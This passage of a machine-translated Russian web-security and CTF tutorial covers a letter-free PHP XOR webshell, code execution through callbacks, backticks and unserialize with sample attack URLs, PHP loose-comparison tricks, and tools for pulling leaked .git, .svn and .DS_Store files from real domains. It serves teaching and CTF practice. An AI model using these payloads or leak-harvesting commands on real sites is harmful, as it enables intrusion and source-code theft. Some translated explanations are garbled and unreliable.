+<div class="highlight"><pre><span></span><code><span class="x">$__ = (&quot;#&quot; ^ &quot;|&quot;) . (&quot;.&quot; ^ &quot;~&quot;) . (&quot;/&quot; ^ &quot;`&quot;) . (&quot;|&quot; ^ &quot;/&quot;) . (&quot;{&quot; ^ &quot;/&quot;);</span>
+</code></pre></div>
+<p>Оглядываясь назад на вопрос об обучении <code>xman</code>, наша идея состоит в том, чтобы обойти строку символов, построив XOR, так
+как же нам построить эту строку так, чтобы длина была меньше <code>40</code>?</p>
+<p>Наконец, мы хотим прочитать функцию <code>getFlag</code>, нам нужно создать <code>_GET</code> для чтения этой функции, мы, наконец, создаем
+следующую строку:</p>
+<p><img alt="payloads" src="../../assets/img/web/payloads.png" /></p>
+<p>Возможно, многие мелкие партнеры до сих пор не могут понять, как устроена эта цепочка. Разберем строку сегмента.</p>
+<h4 id="_get">Построить <code>_GET</code> чтение</h4>
+<p>Прежде всего, мы должны знать, что такое <code>X_GET</code> от XOR. После своих попыток и анализа я пришел к следующему выводу:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="s2">&quot;`{{{&quot;</span> <span class="o">^</span> <span class="s2">&quot;?&lt;&gt;/&quot;</span><span class="p">;</span> <span class="c1">//_GET</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>В чем смысл этого кода? Из-за ограничения длины в 40 символов веб-оболочки, которые ранее были соединены операцией XOR с
+символами, использовать нельзя. Здесь вы можете использовать обратные кавычки <code>`</code> и <code>Linux</code> под php для
+выполнения команды <code>?</code></p>
+<ul>
+<li><code>?</code> означает соответствие одного символа</li>
+<li><code>`</code> означает выполнение команды</li>
+<li><code>`</code> Разбор специальной строки</li>
+</ul>
+<p>Поскольку <code>?</code> может соответствовать только одному символу, этот способ записи означает зацикливание и сопоставление. Мы
+разберем его, чтобы увидеть:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="s2">&quot;{&quot;</span> <span class="o">^</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p><img alt="answer3" src="../../assets/img/web/answer3.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="s2">&quot;{&quot;</span> <span class="o">^</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p><img alt="answer4" src="../../assets/img/web/answer4.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="s2">&quot;{&quot;</span> <span class="o">^</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p><img alt="answer5" src="../../assets/img/web/answer5.png" /></p>
+<p>Итак, мы можем знать, что <code>_GET</code> устроен следующим образом!</p>
+<h4 id="_get_1">Получить параметр <code>_GET</code></h4>
+<p>Как нам получить параметр <code>_GET</code>? Мы можем построить следующую строку:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="nv">${$_}</span><span class="p">[</span><span class="nx">_</span><span class="p">](</span><span class="nv">${$_}</span><span class="p">[</span><span class="nx">__</span><span class="p">]);</span> <span class="c1">//$_GET[_]($_GET[__])</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Согласно предыдущей конструкции <code>$_</code> превратилось в <code>_GET</code>. Естественно, <code>$_ = _GET</code>. Мы создали <code>$_GET[__]</code> для
+получения значений параметров.</p>
+<h4 id="_9">Входящие параметры</h4>
+<p>На этом этапе нам просто нужно вызвать функцию <code>getFlag</code>, чтобы получить <code>веб-оболочку</code>, построенную следующим образом:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="nv">$_</span> <span class="o">=</span> <span class="nx">getFlag</span><span class="p">;</span> <span class="c1">//getFlag</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Итак, подключите все параметры, и все готово.</p>
+<p><img alt="payloads" src="../../assets/img/web/payloads.png" /></p>
+<p>Результаты приведены ниже:</p>
+<p><img alt="flag" src="../../assets/img/web/flag.png" /></p>
+<p>Итак, мы успешно прочитали флаг!</p>
+<h3 id="_10">Динамическое выполнение функции</h3>
+<p>Пользовательские функции могут привести к выполнению кода.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$dyn_func</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;dyn_func&quot;</span><span class="p">];</span>
+    <span class="nv">$argument</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;argument&quot;</span><span class="p">];</span>
+    <span class="nv">$dyn_func</span><span class="p">(</span><span class="nv">$argument</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<h3 id="_11">Выполнение команды обратной кавычки</h3>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="sb">`ls -la`</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<h3 id="_12">Фигурный синтаксис</h3>
+<p>Фигурный синтаксис PHP также может привести к выполнению кода, он выполнит код, заключенный в фигурные скобки, и заменит
+результаты.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;aaabbbccc</span><span class="si">${</span><span class="nv">`ls`</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$foobar</span> <span class="o">=</span> <span class="s2">&quot;phpinfo&quot;</span><span class="p">;</span>
+    <span class="err">$</span><span class="p">{</span><span class="s2">&quot;foobar&quot;</span><span class="p">}();</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<h3 id="_13">Функция обратного вызова</h3>
+<p>Многие функции могут выполнять функции обратного вызова, что вызовет выполнение кода, когда функция обратного вызова
+управляется пользователем.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$evil_callback</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;callback&quot;</span><span class="p">];</span>
+    <span class="nv">$some_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
+    <span class="nv">$new_array</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="nv">$evil_callback</span><span class="p">,</span> <span class="nv">$some_array</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Полезная нагрузка атаки</p>
+<div class="highlight"><pre><span></span><code>http://www.a.com/index.php?callback=phpinfo
+</code></pre></div>
+<h3 id="_14">Десериализация</h3>
+<p>Если <code>unserialize()</code> определяет функцию <code>__destruct()</code> или <code>__wakeup()</code> во время выполнения, это может вызвать
+выполнение кода.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
+    <span class="nx">was</span> <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+      <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;saved_code&quot;</span><span class="p">]);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Полезная нагрузка атаки</p>
+<div class="highlight"><pre><span></span><code>http://www.a.com/index.php?saved_code=O:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}
+</code></pre></div>
+<h2 id="php">PHP особенности</h2>
+<h3 id="_15">Массив</h3>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="nv">$var</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;string&quot;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Php не строго проверяет типы входящих переменных, и не может свободно преобразовывать типы.</p>
+<p>Например, при сравнении <code>$a == $b</code></p>
+<div class="highlight"><pre><span></span><code><span class="x">$a = null; </span>
+<span class="x">$b = false; // is true</span>
+<span class="x">$a = &#39;&#39;; </span>
+<span class="x">$b = 0; //also true</span>
+</code></pre></div>
+<p>Тем не менее, разработчики ядра PHP изначально хотели позволить программистам более эффективно развиваться с этой
+системой, которая не требует деклараций, поэтому многие слабо используемые сравнения и преобразования использовались
+почти во всех встроенных функциях и базовых структурах, чтобы предотвратить использование программ. . Переменные часто
+сообщаются неправильно из-за неправильности программиста, но это создает проблемы с безопасностью.</p>
+<div class="highlight"><pre><span></span><code><span class="x">0 == &#39;0&#39; //true</span>
+<span class="x">0 == &#39;abcdefg&#39; //true</span>
+<span class="x">0 === &#39;abcdefg&#39; //false</span>
+<span class="x">1 == &#39;1abcdef&#39; //true</span>
+</code></pre></div>
+<h3 id="_16">Волшебный хеш</h3>
+<div class="highlight"><pre><span></span><code><span class="x">&quot;0e132456789&quot; == &quot;0e7124511451155&quot; //true</span>
+<span class="x">&quot;0e123456abc&quot; == &quot;0e1dddada&quot; //false</span>
+<span class="x">&quot;0e1abc&quot; == &quot;0&quot;  //true</span>
+</code></pre></div>
+<p>Если при выполнении операции сравнения встречается такая строка, как <code>0e\d+</code>, она анализируется в экспоненциальном
+представлении. Таким образом, значения двух чисел в приведенном выше примере равны 0 и, следовательно, равны. Если
+шаблон <code>0e\d+</code> не выполняется, он не будет равным.</p>
+<h3 id="_17">Шестнадцатеричное преобразование</h3>
+<div class="highlight"><pre><span></span><code><span class="x">&quot;0x1e240&quot; == &quot;123456&quot; //true</span>
+<span class="x">&quot;0x1e240&quot; == 123456 //true</span>
+<span class="x">&quot;0x1e240&quot; == &quot;1e240&quot; //false</span>
+</code></pre></div>
+<p>Когда одна из строк начинается с <code>0x</code>, PHP разбирает строку в десятичную дробь и затем сравнивает ее. Разбор <code>0x1240</code> в
+десятичный формат равен 123456, поэтому с типом <code>int</code> и типом <code>string</code> 123456 сравнения одинаковы.</p>
+<h3 id="_18">Преобразование типов</h3>
+<p>Общие преобразования в основном преобразуются <code>int</code> в <code>string</code>, а <code>string</code> в <code>int</code>.</p>
+<p><code>string</code> в <code>int</code></p>
+<div class="highlight"><pre><span></span><code><span class="x">$var = 5;</span>
+<span class="x">Method 1: $item = (string)$var;</span>
+<span class="x">Method 2: $item = strval($var);</span>
+</code></pre></div>
+<p><code>string</code> превращает функцию <code>int</code>:<code>intval()</code>.</p>
+<p>Для этой функции вы можете сначала взглянуть на 2 примера.</p>
+<div class="highlight"><pre><span></span><code><span class="x">var_dump(intval(&#39;2&#39;)) // 2</span>
+<span class="x">var_dump(intval(&#39;3abcd&#39;)) // 3</span>
+<span class="x">var_dump(intval(&#39;abcd&#39;)) // 0</span>
+</code></pre></div>
+<p>Если указано преобразование <code>intval()</code>, оно будет преобразовано с начала строки, чтобы знать, что встречен нечисловой
+символ. Даже если есть строка, которую невозможно преобразовать, <code>intval()</code> не сообщит об ошибке, а вернет 0.</p>
+<p>В то же время программистам не следует использовать при программировании следующий код:</p>
+<div class="highlight"><pre><span></span><code><span class="x">if(intval($a)&gt;1000) {</span>
+<span class="x">    mysql_query(&quot;select * from news where id=&quot;.$a)</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>В настоящее время значение <code>$a</code> может быть равно <code>1002 union</code>.</p>
+<h3 id="_19">Свободность параметров встроенных функций</h3>
+<p>Слабость встроенной функции заключается в том, что при вызове функции она передается в тип функции, который функция не
+может принять. Кратко объясните, или прямо на реальных примерах, чтобы проиллюстрировать проблему, следующее будет
+сосредоточено на некоторых из этих функций.</p>
+<h4 id="md5">md5()</h4>
+<div class="highlight"><pre><span></span><code><span class="x">$array1[] = array(</span>
+<span class="x">    &quot;foo&quot; =&gt; &quot;bar&quot;,</span>
+<span class="x">    &quot;bar&quot; =&gt; &quot;foo&quot;,</span>
+<span class="x">);</span>
+<span class="x">$array2 = array(&quot;foo&quot;, &quot;bar&quot;, &quot;hello&quot;, &quot;world&quot;);</span>
+<span class="x">var_dump(md5($array1) == md5($array2)); //threaten</span>
+</code></pre></div>
+<p>Описание функции md5() в руководстве по PHP - <code>string md5(string $str [, bool $raw_output = false ])</code>, а требование
+в <code>md5()</code> - параметр строкового типа. Но когда вы передаете массив, <code>md5()</code> не будет сообщать об ошибке, но не сможет
+правильно найти значение md5 массива, что приведет к равенству значений md5 любых двух массивов.</p>
+<h4 id="strcmp">strcmp()</h4>
+<p>Функция <code>strcmp()</code> описана в официальном руководстве по PHP как <code>intstrcmp(string $str1 , string $str2)</code>, которому
+необходимо передать 2 аргумента типа <code>string</code> в <code>strcmp()</code>. Если <code>str1</code> меньше <code>str2</code>, он возвращает -1, а равенство
+возвращает 0, в противном случае он возвращает 1. Суть функции <code>strcmp()</code> для сравнения строк заключается в
+преобразовании двух переменных в ASCII, затем выполнении вычитания и определении возвращаемое значение в зависимости от
+результата операции.</p>
+<p>Что, если аргумент, который дает <code>strcmp()</code>, является числом?</p>
+<div class="highlight"><pre><span></span><code><span class="x">$array = [1,2,3];</span>
+<span class="x">var_dump(strcmp($array, &#39;123&#39;)); //null, in a sense null is equivalent to false.</span>
+</code></pre></div>
+<h4 id="switch">switch()</h4>
+<p>Если switch() имеет числовой тип, switch преобразует параметры в int следующим образом:</p>
+<div class="highlight"><pre><span></span><code><span class="x">$i = &quot;2abc&quot;;</span>
+<span class="x">switch($i) {</span>
+<span class="x">    case 0:</span>
+<span class="x">    case 1:</span>
+<span class="x">    case 2:</span>
+<span class="x">        echo &quot;i is less than 3 but not negative&quot;;</span>
+<span class="x">        break;</span>
+<span class="x">    case 3:</span>
+<span class="x">        echo &quot;i is 3&quot;;</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>В это время программа выводит <code>i меньше 3, но не отрицательное</code>, потому что функция <code>switch()</code> преобразует <code>$i</code>, и
+результат равен 2.</p>
+<h4 id="in_array">in_array()</h4>
+<p>В руководстве по PHP функция <code>in_array()</code> интерпретируется
+как <code>bool in_array(mixed $needle , array $haystack [, bool $strict = FALSE ])</code>. Если параметр strict не
+указан, <code>in_array</code> будет свободным. Сравните, чтобы увидеть, находится ли <code>$needle</code> в <code>$haystack</code>. Когда значение strict
+истинно, <code>in_array()</code> сравнивает тип игл с типом в стоге сена.</p>
+<div class="highlight"><pre><span></span><code><span class="x">$array = [0, 1, 2, &#39;3&#39;];</span>
+<span class="x">var_dump(in_array(&#39;abc&#39;, $array)); //true</span>
+<span class="x">var_dump(in_array(&#39;1bc&#39;, $array)); //true</span>
+</code></pre></div>
+<p>Вы можете видеть, что в приведенном выше случае возвращается true, потому что <code>'abc'</code> будет преобразовано в 0, а <code>'1bc'</code>
+будет преобразовано в 1.</p>
+<p><code>array_search()</code> аналогичен <code>in_array()</code>.</p>
+<h2 id="_20">Ищем резервную копию исходного кода</h2>
+<h3 id="hg">hg утечка исходного кода</h3>
+<p><code>hg</code> файлы генерируются, когда <code>hg init</code>.</p>
+<p><a href="https://github.com/kost/dvcs-ripper">Использование инструмента dvcs-ripper</a></p>
+<h3 id="git">Утечки исходного кода Git</h3>
+<p>Каталог <code>.git</code> содержит такие файлы, как записи об изменении кода. Если файлы в этом каталоге доступны при
+развертывании, их можно использовать для восстановления исходного кода.</p>
+<div class="highlight"><pre><span></span><code>/.git
+/.git/HEAD
+/.git/index
+/.git/config
+/.git/description
+</code></pre></div>
+<p><a href="https://github.com/lijiejie/GitHack">GitHack</a></p>
+<div class="highlight"><pre><span></span><code>python GitHack.py http://www.openssl.org/.git/
+</code></pre></div>
+<p><a href="https://github.com/WangYihang/GitHacker">GitHacker (Восстанавливаемый полный репозиторий Git)</a></p>
+<div class="highlight"><pre><span></span><code>python GitHacker.py http://www.openssl.org/.git/
+</code></pre></div>
+<h3 id="ds_store"><code>.DS_Store</code> Утечка файла</h3>
+<p>Mac OS будет содержать файл <code>.DS_Store</code>, содержащий такую ​​информацию, как имя файла.</p>
+<p><a href="https://github.com/lijiejie/ds_store_exp">Используя инструмент ds_store_exp</a></p>
+<div class="highlight"><pre><span></span><code>python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store
+
+hd.zj.qq.com/
+└── themes
+    └── galaxyw
+        ├── app
+        │   └── css
+        │       └── style.min.css
+        ├── cityData.min.js
+        ├── images
+        │   └── img
+        │       ├── bg-hd.png
+        │       ├── bg-item-activity.png
+        │       ├── bg-masker-pop.png
+        │       ├── btn-bm.png
+        │       ├── btn-login-qq.png
+        │       ├── btn-login-wx.png
+        │       ├── ico-add-pic.png
+        │       ├── ico-address.png
+        │       ├── ico-bm.png
+        │       ├── ico-duration-time.png
+        │       ├── ico-pop-close.png
+        │       ├── ico-right-top-delete.png
+        │       ├── page-login-hd.png
+        │       ├── pic-masker.png
+        │       └── ticket-selected.png
+        └── member
+            ├── assets
+            │   ├── css
+            │   │   ├── ace-reset.css
+            │   │   └── antd.css
+            │   └── lib
+            │       ├── cityData.min.js
+            │       └── ueditor
+            │           ├── index.html
+            │           ├── lang
+            │           │   └── zh-cn
+            │           │       ├── images
+            │           │       │   ├── copy.png
+            │           │       │   ├── localimage.png
+            │           │       │   ├── music.png
+            │           │       │   └── upload.png
+            │           │       └── zh-cn.js
+            │           ├── php
+            │           │   ├── action_crawler.php
+            │           │   ├── action_list.php
+            │           │   ├── action_upload.php
+            │           │   ├── config.json
+            │           │   ├── controller.php
+            │           │   └── Uploader.class.php
+            │           ├── ueditor.all.js
+            │           ├── ueditor.all.min.js
+            │           ├── ueditor.config.js
+            │           ├── ueditor.parse.js
+            │           └── ueditor.parse.min.js
+            └── static
+                ├── css
+                │   └── page.css
+                ├── img
+                │   ├── bg-table-title.png
+                │   ├── bg-tab-say.png
+                │   ├── ico-black-disabled.png
+                │   ├── ico-black-enabled.png
+                │   ├── ico-coorption-person.png
+                │   ├── ico-miss-person.png
+                │   ├── ico-mr-person.png
+                │   ├── ico-white-disabled.png
+                │   └── ico-white-enabled.png
+                └── scripts
+                    ├── js
+                    └── lib
+                        └── jquery.min.js
+
+<span class="m">21</span> directories, <span class="m">48</span> files
+</code></pre></div>
+<h3 id="-">Файл резервной копии веб-сайта</h3>
+<p>Администратор неправильно разместил резервную копию в веб-каталоге после резервного копирования файла веб-сайта.</p>
+<p>Общие суффиксы:</p>
+<div class="highlight"><pre><span></span><code>.rar
+.zip
+.7z
+.tar
+.tar.gz
+.behind
+.txt
+</code></pre></div>
+<h3 id="svn">Утечка SVN</h3>
+<p>Конфиденциальные документы:</p>
+<div class="highlight"><pre><span></span><code>/.svn
+/.svn/wc.db
+/.svn/entries
+</code></pre></div>
+<p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
+<div class="highlight"><pre><span></span><code>perl rip-svn.pl -v -u http://www.example.com/.svn/
+</code></pre></div>
+<p><a href="http://tools.40huo.cn/#!web.md# source leak">Seay - SVN</a></p>
+<h3 id="web-inf-webxml">Утечка WEB-INF / web.xml</h3>
+<p>WEB-INF - это безопасный каталог для веб-приложений Java, и в web.xml есть сопоставления файлов.</p>
+<p>WEB-INF в основном содержит следующие файлы или каталоги:</p>
+<ul>
+<li><code>/WEB-INF/web.xml</code>: файл конфигурации веб-приложения, описывающий сервлет и другие правила настройки и именования
+  компонентов приложения.</li>
+<li><code>/WEB-INF/classes/</code>: содержит все файлы классов, используемые сайтом, включая класс сервлетов и класс не сервлетов, их
+  нельзя включить. В файле jar.</li>
+<li><code>/WEB-INF/lib/</code>: хранит различные файлы jar, необходимые веб-приложению, и размещает файлы jar, которые требуются
+  только в этом приложении, например файлы jar драйвера базы данных.</li>
+<li><code>/WEB-INF/src/</code>: исходный каталог, каждый файл java размещается в соответствии со структурой имени пакета.</li>
+<li><code>/WEB-INF/database.properties</code>: файл конфигурации базы данных.</li>
+</ul>
+<p>После нахождения файла web.xml, определения пути к файлу класса и, наконец, непосредственной классификации файла,
+исходный код веб-сайта получается путем декомпиляции файла класса. В общем, движку jsp по умолчанию запрещен доступ к
+каталогу WEB-INF. Когда Nginx работает с Tomcat для балансировки нагрузки или кластера, причина проблемы на самом деле
+очень проста. Nginx не будет рассматривать настройку движков других типов (Nginx не является движком jsp). Проблема
+безопасности вводится в его собственную спецификацию безопасности (так что связь слишком высока), можно изменить файл
+конфигурации Nginx для блокировки доступа к каталогу WEB-INF:</p>
+<div class="highlight"><pre><span></span><code><span class="k">Location</span> <span class="p">~</span> <span class="sr">^/WEB-INF/*</span> <span class="p">{</span> <span class="kn">deny</span> <span class="s">all</span><span class="p">;</span> <span class="p">}</span> <span class="c1"># or return 404; or other!</span>
+</code></pre></div>
+<h3 id="cvs">Утечка CVS</h3>
+<div class="highlight"><pre><span></span><code>http://url/CVS/Root returns the root information
+http://url/CVS/Entries returns the structure of all files
+</code></pre></div>
+<p>Получить исходный код</p>
+<div class="highlight"><pre><span></span><code>bk clone http://url/name dir
+</code></pre></div>
+<h3 id="_21">Рекомендации</h3>
+<ul>
+<li><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">Помните яму, на которую наступила веб-оболочка (как написать бэкдор, не содержащий цифр и букв в PHP)</a></li>
+</ul>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../introduction.ru" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Назад
+                </span>
+                Введение
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../sqli.ru" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Вперед
+                </span>
+                Sqli
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2021 Illia Novak
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://github.com/anakilivo" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://www.linkedin.com/in/illia-novak/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+      </a>
+    
+      
+      
+      <a href="mailto:anakilivo@gmail.com" target="_blank" rel="noopener" title="" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M476 3.2L12.5 270.6c-18.1 10.4-15.8 35.6 2.2 43.2L121 358.4l287.3-253.2c5.5-4.9 13.3 2.6 8.6 8.3L176 407v80.5c0 23.6 28.5 32.9 42.5 15.8L282 426l124.6 52.2c14.2 6 30.4-2.9 33-18.2l72-432C515 7.8 493.3-6.8 476 3.2z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.53cc9318.min.js"></script>
+      <script src="../../assets/javascripts/bundle.e9c9f54f.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u041a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0432 \u0431\u0443\u0444\u0435\u0440", "clipboard.copied": "\u0421\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u043e \u0432 \u0431\u0443\u0444\u0435\u0440", "search.config.lang": "ru", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "\u041f\u043e\u0438\u0441\u043a", "search.result.placeholder": "\u041d\u0430\u0447\u043d\u0438\u0442\u0435 \u043f\u0435\u0447\u0430\u0442\u0430\u0442\u044c \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430", "search.result.none": "\u0421\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e", "search.result.one": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e 1 \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0435", "search.result.other": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e # \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: [],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.9c0e82ba.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
